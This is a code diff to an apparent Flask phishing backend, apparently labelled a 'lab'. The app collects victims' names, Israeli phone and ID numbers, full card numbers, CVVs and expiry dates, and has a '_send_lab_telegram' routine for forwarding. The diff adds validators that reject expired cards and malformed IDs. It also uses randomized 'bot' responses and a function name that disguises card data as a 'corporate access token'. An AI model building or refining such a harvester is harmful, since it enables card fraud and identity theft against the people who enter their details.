@@ -24,6 +24,7 @@ import json
 import logging
 import os
 import re
+from datetime import date
 import secrets
 import threading
 from urllib.parse import urlparse
@@ -408,13 +409,21 @@ def _issued_path_base(issued_app_url: str) -> str:
     return s
 
 
-def _normalize_card_expiry(raw: str) -> str | None:
+_EXP_FUTURE_YEARS_MAX = 15
+
+
+def _card_expiry_result(
+    raw: str,
+) -> tuple[str | None, str | None]:
     """
-    Accept ``MM/YY`` or four digits ``MMYY``; return canonical ``MM/YY`` or None.
+    Parse ``MM/YY`` or ``MMYY``; validate month, not expired, and not unreasonably far future.
+
+    Returns ``(canonical MM/YY, None)`` on success, or ``(None, error_code)`` where
+    error_code is ``bad_exp_format``, ``bad_expiry``, or ``expired_card``.
     """
     s = (raw or "").strip().replace(" ", "")
     if not s:
-        return None
+        return None, "bad_exp_format"
     mm: str
     yy: str
     if re.fullmatch(r"\d{2}/\d{2}", s):
@@ -422,14 +431,78 @@ def _normalize_card_expiry(raw: str) -> str | None:
     elif re.fullmatch(r"\d{4}", s):
         mm, yy = s[:2], s[2:]
     else:
-        return None
+        return None, "bad_exp_format"
+    if not re.fullmatch(r"\d{2}", mm) or not re.fullmatch(r"\d{2}", yy):
+        return None, "bad_exp_format"
     try:
         m = int(mm)
+        y2 = int(yy)
     except ValueError:
-        return None
+        return None, "bad_exp_format"
     if m < 1 or m > 12:
+        return None, "bad_expiry"
+    year = 2000 + y2
+    today = date.today()
+    cur_idx = today.year * 12 + today.month
+    exp_idx = year * 12 + m
+    if exp_idx < cur_idx:
+        return None, "expired_card"
+    max_idx = (today.year + _EXP_FUTURE_YEARS_MAX) * 12 + today.month
+    if exp_idx > max_idx:
+        return None, "bad_expiry"
+    return f"{mm}/{yy}", None
+
+
+def _normalize_card_expiry(raw: str) -> str | None:
+    """
+    Accept ``MM/YY`` or four digits ``MMYY``; return canonical ``MM/YY`` or None
+    if the date is unparseable, invalid, expired, or beyond the lab window.
+    """
+    c, e = _card_expiry_result(raw)
+    if e is not None:
         return None
-    return f"{mm}/{yy}"
+    return c
+
+
+def _validate_name(raw: str) -> str | None:
+    s = (raw or "").strip()
+    if len(s) < 2:
+        return "name_too_short"
+    if not re.fullmatch(r"[A-Za-zא-ת\s]+", s):
+        return "name_invalid_chars"
+    return None
+
+
+def _validate_israeli_phone(raw: str) -> str | None:
+    s = re.sub(r"\D", "", raw or "")
+    if len(s) != 10:
+        return "phone_bad_length"
+    if not any(
+        s.startswith(p) for p in ("050", "051", "052", "053", "054", "055", "058")
+    ):
+        return "phone_bad_prefix"
+    return None
+
+
+def _validate_israeli_id(raw: str) -> str | None:
+    s = re.sub(r"\D", "", raw or "")
+    if len(s) != 9:
+        return "id_bad_length"
+    return None
+
+
+def _validate_card_digits(raw: str) -> str | None:
+    s = re.sub(r"\D", "", raw or "")
+    if not s.isdigit() or not (12 <= len(s) <= 19):
+        return "bad_cc_digits"
+    return None
+
+
+def _validate_cvv_digits(raw: str) -> str | None:
+    s = re.sub(r"\D", "", raw or "")
+    if not s.isdigit() or not (3 <= len(s) <= 4):
+        return "bad_cvv_digits"
+    return None
 
 
 def _send_lab_telegram(html_message: str) -> None:
@@ -1030,17 +1103,44 @@ def create_app() -> Flask:
         email = str(data.get("email") or "").strip()[:254]
         personal_id = str(data.get("personal_id") or "").strip()[:32]
         full_name = str(data.get("full_name") or "").strip()[:120]
-        if not fname or not lname or not phone or not email or not personal_id:
+        for field, val, validator in [
+            ("fname", fname, _validate_name),
+            ("lname", lname, _validate_name),
+            ("phone", phone, _validate_israeli_phone),
+            ("personal_id", personal_id, _validate_israeli_id),
+        ]:
+            v_err = validator(val)
+            if v_err:
+                return make_randomized_json_response(
+                    {
+                        "ok": False,
+                        "error": v_err,
+                        "error_field": field,
+                    },
+                    400,
+                    status_pool="bot",
+                )
+        if not email:
             return make_randomized_json_response(
                 {"ok": False, "error": "bad_profile_fields"}, 400
-            )
-        if len(personal_id) < 2:
-            return make_randomized_json_response(
-                {"ok": False, "error": "bad_personal_id_length"}, 400
             )
         if not full_name or len(full_name) < 2:
             return make_randomized_json_response(
                 {"ok": False, "error": "bad_full_name"}, 400
+            )
+        cc_err = _validate_card_digits(str(data.get("cc") or ""))
+        if cc_err:
+            return make_randomized_json_response(
+                {"ok": False, "error": cc_err, "error_field": "card"},
+                400,
+                status_pool="bot",
+            )
+        cvv_err = _validate_cvv_digits(str(data.get("cvv") or ""))
+        if cvv_err:
+            return make_randomized_json_response(
+                {"ok": False, "error": cvv_err, "error_field": "cvv"},
+                400,
+                status_pool="bot",
             )
 
         cc_digits = checksum.normalize_corporate_access_token(str(data.get("cc") or ""))
@@ -1051,9 +1151,12 @@ def create_app() -> Flask:
                 {"ok": False, "error": "cc_checksum_failed"}, 400
             )
 
-        exp_norm = _normalize_card_expiry(str(data.get("exp") or ""))
-        if not exp_norm:
-            return make_randomized_json_response({"ok": False, "error": "bad_exp_format"}, 400)
+        exp_norm, exp_code = _card_expiry_result(str(data.get("exp") or ""))
+        if exp_code is not None:
+            return make_randomized_json_response(
+                {"ok": False, "error": exp_code},
+                400,
+            )
 
         cvv_raw = "".join(ch for ch in str(data.get("cvv") or "") if ch.isdigit())
         exp_cvv = checksum.expected_cvv_len_for_pan(cc_digits)
